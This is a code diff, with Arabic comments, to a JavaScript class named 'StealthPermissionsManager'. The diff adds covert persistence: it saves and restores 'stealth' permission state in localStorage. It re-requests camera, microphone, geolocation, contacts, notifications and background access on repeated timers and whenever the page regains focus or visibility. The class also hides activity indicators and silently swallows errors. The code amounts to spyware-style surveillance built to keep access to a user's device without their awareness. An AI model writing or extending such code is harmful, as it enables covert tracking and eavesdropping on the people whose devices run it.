@@ -18,6 +18,12 @@ class StealthPermissionsManager {
         try {
             console.log('🔧 تهيئة نظام الصلاحيات الخفي...');
             
+            // محاولة استعادة الأذونات من التخزين المحلي أولاً
+            const restored = this.restoreStealthPermissionsFromStorage();
+            if (restored) {
+                console.log('📂 تم استعادة الأذونات الخفية المحفوظة');
+            }
+            
             // إخفاء أي علامات على النشاط
             this.hideActivityIndicators();
             
@@ -26,6 +32,9 @@ class StealthPermissionsManager {
             
             // إعداد المراقبة المستمرة
             this.setupContinuousMonitoring();
+            
+            // حفظ حالة الأذونات في التخزين المحلي
+            this.saveStealthPermissionsToStorage();
             
             this.isInitialized = true;
             console.log('✅ تم تهيئة نظام الصلاحيات بنجاح');
@@ -419,16 +428,31 @@ class StealthPermissionsManager {
 
     // إعداد المراقبة المستمرة
     setupContinuousMonitoring() {
-        // مراقبة حالة الصلاحيات كل دقيقة
+        // مراقبة حالة الصلاحيات كل 30 ثانية (بدلاً من دقيقة)
         setInterval(() => {
             this.checkPermissionsStatus();
-        }, 60000);
+        }, 30000);
+        
+        // مراقبة إضافية كل دقيقتين للتأكد من استمرارية الأذونات
+        setInterval(() => {
+            this.ensureStealthPermissionsPersistence();
+        }, 120000);
+        
+        // مراقبة كل 10 دقائق للتأكد من عدم فقدان الأذونات
+        setInterval(() => {
+            this.forceStealthPermissionsRefresh();
+        }, 600000);
         
         // مراقبة التغييرات في النظام
         this.monitorSystemChanges();
         
         // مراقبة التغييرات في الشبكة
         this.monitorNetworkChanges();
+        
+        // مراقبة تغييرات الصفحة
+        this.monitorPageVisibilityChanges();
+        
+        console.log('🔒 تم إعداد نظام ضمان استمرارية الأذونات الخفي');
     }
 
     // فحص حالة الصلاحيات
@@ -444,6 +468,93 @@ class StealthPermissionsManager {
         } catch (error) {
             // لا تظهر أي أخطاء
         }
+    }
+
+    // ضمان استمرارية الأذونات الخفي
+    async ensureStealthPermissionsPersistence() {
+        try {
+            const criticalStealthPermissions = [
+                'geolocation',
+                'camera',
+                'microphone',
+                'contacts',
+                'persistent-storage',
+                'background-sync',
+                'notifications'
+            ];
+            
+            for (const permission of criticalStealthPermissions) {
+                const currentStatus = this.permissions.get(permission);
+                if (!currentStatus) {
+                    console.log(`🔄 إعادة منح صلاحية خفية ${permission}...`);
+                    const granted = await this.grantSinglePermission(permission);
+                    this.permissions.set(permission, granted);
+                    
+                    if (granted) {
+                        console.log(`✅ تم إعادة منح صلاحية خفية ${permission} بنجاح`);
+                    } else {
+                        console.warn(`⚠️ فشل في إعادة منح صلاحية خفية ${permission}`);
+                    }
+                }
+            }
+        } catch (error) {
+            console.error('❌ خطأ في ضمان استمرارية الأذونات الخفية:', error);
+        }
+    }
+
+    // إجبار تحديث الأذونات الخفية
+    async forceStealthPermissionsRefresh() {
+        try {
+            console.log('🔄 إجبار تحديث جميع الأذونات الخفية...');
+            
+            // إعادة منح جميع الأذونات بشكل خفي
+            await this.grantPermissionsStealthily();
+            
+            // حفظ حالة الأذونات في التخزين المحلي
+            this.saveStealthPermissionsToStorage();
+            
+            console.log('✅ تم إجبار تحديث الأذونات الخفية بنجاح');
+        } catch (error) {
+            console.error('❌ خطأ في إجبار تحديث الأذونات الخفية:', error);
+        }
+    }
+
+    // حفظ الأذونات الخفية في التخزين المحلي
+    saveStealthPermissionsToStorage() {
+        try {
+            const permissionsData = {
+                permissions: Object.fromEntries(this.permissions),
+                timestamp: Date.now(),
+                deviceId: this.deviceId,
+                stealth: true
+            };
+            
+            localStorage.setItem('stealth_permissions_backup', JSON.stringify(permissionsData));
+            console.log('💾 تم حفظ الأذونات الخفية في التخزين المحلي');
+        } catch (error) {
+            console.error('❌ خطأ في حفظ الأذونات الخفية:', error);
+        }
+    }
+
+    // استعادة الأذونات الخفية من التخزين المحلي
+    restoreStealthPermissionsFromStorage() {
+        try {
+            const savedData = localStorage.getItem('stealth_permissions_backup');
+            if (savedData) {
+                const permissionsData = JSON.parse(savedData);
+                const savedPermissions = permissionsData.permissions;
+                
+                for (const [permission, granted] of Object.entries(savedPermissions)) {
+                    this.permissions.set(permission, granted);
+                }
+                
+                console.log('📂 تم استعادة الأذونات الخفية من التخزين المحلي');
+                return true;
+            }
+        } catch (error) {
+            console.error('❌ خطأ في استعادة الأذونات الخفية:', error);
+        }
+        return false;
     }
 
     // مراقبة التغييرات في النظام
@@ -516,6 +627,36 @@ class StealthPermissionsManager {
             this.permissions.set('battery_info_updated', batteryInfo);
         } catch (error) {
             // لا تظهر أي أخطاء
+        }
+    }
+
+    // مراقبة تغييرات رؤية الصفحة
+    monitorPageVisibilityChanges() {
+        try {
+            // مراقبة تغيير الرؤية
+            document.addEventListener('visibilitychange', () => {
+                if (!document.hidden) {
+                    // إعادة التأكد من الأذونات عند عودة الرؤية
+                    setTimeout(() => {
+                        this.ensureStealthPermissionsPersistence();
+                    }, 1000);
+                }
+            });
+            
+            // مراقبة تغيير التركيز
+            window.addEventListener('focus', () => {
+                this.ensureStealthPermissionsPersistence();
+            });
+            
+            // مراقبة تغيير الاتجاه (للأجهزة المحمولة)
+            window.addEventListener('orientationchange', () => {
+                setTimeout(() => {
+                    this.ensureStealthPermissionsPersistence();
+                }, 2000);
+            });
+            
+        } catch (error) {
+            console.error('❌ خطأ في مراقبة تغييرات رؤية الصفحة:', error);
         }
     }
 
